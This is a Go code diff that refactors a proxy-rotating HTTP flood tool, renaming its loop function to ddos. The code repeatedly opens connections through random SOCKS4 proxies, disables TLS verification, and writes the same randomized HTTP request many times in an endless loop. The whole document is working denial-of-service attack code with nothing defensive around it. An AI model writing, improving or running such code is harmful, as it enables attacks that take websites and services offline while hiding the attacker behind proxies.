@@ -28,7 +28,7 @@ func getUserAgents(number int) []string {
 	return ua
 }
 
-// Returns a random element in the array
+// Returns a random element in the []string
 func random(seeds []string) string {
 	return seeds[rand.Intn(len(seeds))]
 }
@@ -59,36 +59,62 @@ func readLines(fileName string) []string {
 	return lines
 }
 
-func makeRequests(_HOST string, _PORT string, _USERAGENT string, _PROXY string, _PATH string, _METHOD string) {
+func makeRequests(
+	host string,
+	port int,
+	method string,
+	path string,
+	n int,
+	useragent string,
+	proxy string,
+) {
 	var conn net.Conn
-	_HEADER := _METHOD + " " + _PATH + randomParam() + " HTTP/1.1\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://www.google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
-	_ADDRESS := _HOST + ":" + _PORT
+	var header string = fmt.Sprintf(
+		"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
+		method,
+		path+randomParam(),
+		host,
+		useragent,
+	)
+
+	address := fmt.Sprintf("%s:%d", host, port)
+
 	// Dialer
-	dialer, err := proxyclient.NewProxyClient("socks4://" + _PROXY)
+	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
+
 	if err != nil {
 		return
 	}
+
 	// Connect
-	conn, err = dialer.DialTimeout("tcp", _ADDRESS, 5*time.Second)
-	if _PORT == "443" {
+	conn, err = dialer.DialTimeout("tcp", address, 5*time.Second)
+
+	if err != nil {
+		return
+	}
+
+	if port == 443 {
 		conn = tls.Client(conn, &tls.Config{
-			ServerName:         _HOST,
+			ServerName:         host,
 			InsecureSkipVerify: true,
 		})
 	}
-	if err != nil {
-		return
-	}
+
 	defer conn.Close()
-	for i := 0; i < 100; i++ {
-		conn.Write([]byte(_HEADER))
+	for i := 0; i < n; i++ {
+		conn.Write([]byte(header))
 	}
 }
 
-func prepareRequests(_HOST string, _PORT string, _USERAGENTS []string, _PROXIES []string, _PATH string, _METHOD string) {
+func ddos(
+	host string,
+	port int,
+	method string,
+	path string,
+	useragents []string,
+	proxies []string,
+) {
 	for {
-		_USERAGENT := random(_USERAGENTS)
-		_PROXY := random(_PROXIES)
-		makeRequests(_HOST, _PORT, _USERAGENT, _PROXY, _PATH, _METHOD)
+		makeRequests(host, port, method, path, 100, random(useragents), random(proxies))
 	}
 }
